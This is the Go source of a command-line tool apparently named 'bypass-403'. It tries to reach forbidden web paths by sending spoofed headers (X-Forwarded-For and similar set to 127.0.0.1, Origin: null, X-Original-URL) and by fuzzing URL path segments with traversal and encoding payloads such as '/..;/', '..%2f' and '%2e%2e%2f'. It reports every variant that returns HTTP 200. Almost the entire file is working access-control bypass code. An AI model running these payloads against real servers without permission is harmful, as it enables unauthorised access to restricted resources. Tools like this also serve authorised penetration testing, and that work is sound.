package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	version     = "0.0.1"
	fuzzerKey   = "FUZZ"
	headerValue = "127.0.0.1"
)

type (
	Config struct {
		Url      string
		Silent   bool
		Json     bool
		UseStdin bool
		Threads  int
		Timeout  int
	}

	Target struct {
		Host        string
		HeaderKey   string
		HeaderValue string
	}

	Output struct {
		Code   int    `json:"code"`
		Target string `json:"target"`
		Header string `json:"header"`
	}
)

var (
	config         Config
	headerPayloads = []string{
		"X-Custom-IP-Authorization",
		"X-Forwarded-For",
		"X-ProxyUser-Ip",
		"X-Forwarded-Host",
		"X-Originating-IP",
		"X-Forwarded-port",
		"X-Forwarded-by",
		"X-Forwarded-Scheme",
		"X-Frame-Options",
		"X-Client-IP",
		"X-Remote-IP",
		"X-Remote-Addr",
		"Client-IP",
		"X-Host",
	}

	urlHeader = []string{
		"X-Original-URL",
		"X-rewrite-url",
	}

	urlPayloads = []string{
		"؟",
		"؟؟",
		"&",
		"#",
		"%",
		"%20",
		"%09",
		"/",
		"/..;/",
		"../",
		"/",
		"/*",
		"/%2f/",
		"/./",
		"./.",
		"/*/",
		"?",
		"??",
		"&",
		"#",
		"%",
		"%20",
		"%09",
		"/..;/",
		"../",
		"..%2f",
		"..;/",
		".././",
		"..%00/",
		"..%0d",
		"..%5c",
		"..%ff/",
		"%2e%2e%2f",
		".%2e/",
		"%3f",
		"%26",
		"%23",
		".json",
	}
	targetList []*url.URL
	stdout     *log.Logger
)

func main() {
	log.SetFlags(0)
	stdout = log.New(os.Stdout, "", 0)
	parseArguments()
	if !config.Silent {
		showBanner()
	}

	targets := make(chan Target, 0)
	wg := sync.WaitGroup{}
	wg.Add(config.Threads)

	for config.Threads > 0 {
		config.Threads -= 1
		go func() {
			for {
				target := <-targets
				if target.Host == "" {
					break
				}
				checkTarget(target)
			}
			wg.Done()
		}()
	}

	for _, t := range targetList {
		us := t.String()
		targets <- Target{Host: us, HeaderKey: "Origin", HeaderValue: "null"}
		for _, hk := range headerPayloads {
			targets <- Target{Host: us, HeaderKey: hk, HeaderValue: headerValue}
		}

		u := copyUrl(t)
		up := u.Path
		u.Path = ""
		us = u.String()
		for _, hk := range urlHeader {
			targets <- Target{Host: us, HeaderKey: hk, HeaderValue: up}
		}

		fl := buildTargetList(t)
		for _, f := range fl {
			for _, p := range urlPayloads {
				targets <- Target{Host: strings.Replace(f, fuzzerKey, p, 1)}
			}
		}

	}

	close(targets)
	wg.Wait()

}

func buildTargetList(baseUrl *url.URL) []string {
	parts := strings.Split(baseUrl.Path, "/")
	list := make([]string, 0, len(parts))
	for i := 0; i < len(parts); i++ {
		p := make([]string, len(parts))
		copy(p, parts)
		p[i] = fuzzerKey + strings.TrimSpace(p[i])
		u := copyUrl(baseUrl)
		u.Path = strings.Join(p, "/")
		list = append(list, u.String())
		t := strings.ToUpper(p[i])
		if t != p[i] {
			p[i] = t
			u.Path = strings.Join(p, "/")
			list = append(list, u.String())
		}
	}
	u := copyUrl(baseUrl)
	u.Path += fuzzerKey
	list = append(list, u.String())
	return list
}

func copyUrl(baseUrl *url.URL) *url.URL {
	u, err := url.Parse(baseUrl.String())
	if err != nil {
		log.Fatalln(err)
	}
	return u
}

func checkTarget(target Target) {
	code, err := Request(target, time.Duration(config.Timeout)*time.Second)
	if err != nil {
		return
	}
	var res string

	h := ""
	if target.HeaderKey != "" {
		h = target.HeaderKey + ":" + target.HeaderValue
	}

	if config.Json {
		v := Output{code, target.Host, h}
		o, err := json.Marshal(v)
		if err != nil {
			return
		}
		res = string(o)
	} else {
		res = fmt.Sprintf("%v\t%v\t%v", code, target.Host, h)
	}
	if code != 200 {
		if !config.Silent {
			log.Println(res)
		}
		return
	}
	stdout.Println(res)
}

func showBanner() {
	log.Println("\n██████╗░██╗░░░██╗██████╗░░█████╗░░██████╗░██████╗░░░░░░░░██╗██╗░█████╗░██████╗░\n██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝░░░░░░░██╔╝██║██╔══██╗╚════██╗\n██████╦╝░╚████╔╝░██████╔╝███████║╚█████╗░╚█████╗░█████╗██╔╝░██║██║░░██║░█████╔╝\n██╔══██╗░░╚██╔╝░░██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗╚════╝███████║██║░░██║░╚═══██╗\n██████╦╝░░░██║░░░██║░░░░░██║░░██║██████╔╝██████╔╝░░░░░░╚════██║╚█████╔╝██████╔╝\n╚═════╝░░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░░░░░░░░░░░░╚═╝░╚════╝░╚═════╝░", version)
}

func parseArguments() {
	flag.BoolVar(&config.Silent, "silent", false, "Disable banner")
	flag.BoolVar(&config.Json, "json", false, "Output format as json")
	flag.StringVar(&config.Url, "url", "", "comma separated Urls to check")
	flag.IntVar(&config.Threads, "t", 10, "Number of threads to use")
	flag.IntVar(&config.Timeout, "timeout", 10, "Seconds to wait before timeout.")
	flag.BoolVar(&config.UseStdin, "stdin", false, "Read targets url from stdin")
	flag.Parse()

	targetList = make([]*url.URL, 0)
	if !config.UseStdin {
		urls := strings.Split(config.Url, ",")
		for _, us := range urls {
			ok, u := isValidUrl(us)
			if ok {
				targetList = append(targetList, u)
			}
		}
	} else {
		sc := bufio.NewScanner(os.Stdin)
		for sc.Scan() {
			ok, u := isValidUrl(sc.Text())
			if ok {
				targetList = append(targetList, u)
			}
		}
		if err := sc.Err(); err != nil {
			log.Fatalln(err)
		}
	}

	if len(targetList) == 0 {
		log.Println("error: empty target list")
		flag.Usage()
		os.Exit(1)
	}
}

func isValidUrl(toTest string) (bool, *url.URL) {
	_, err := url.ParseRequestURI(toTest)
	if err != nil {
		return false, nil
	}

	u, err := url.Parse(toTest)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return false, nil
	}

	return true, u
}
